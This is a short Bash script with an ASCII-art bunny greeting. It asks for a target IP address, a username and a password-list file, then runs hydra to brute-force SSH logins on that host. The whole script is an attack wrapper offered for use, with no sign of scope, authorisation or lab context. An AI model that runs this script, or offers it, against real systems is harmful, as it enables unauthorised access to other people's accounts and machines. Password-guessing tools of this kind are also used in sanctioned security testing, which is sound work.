 echo "
  .-------.
  |  Hi   |
  '-------'
      ^      (\_/)
      '----- (O.o)
             (> <)

"

echo Enter Ip
read ip 

echo Enter UserName
read user

echo Enter passlist
read pass

hydra -l $user -P $pass $ip ssh


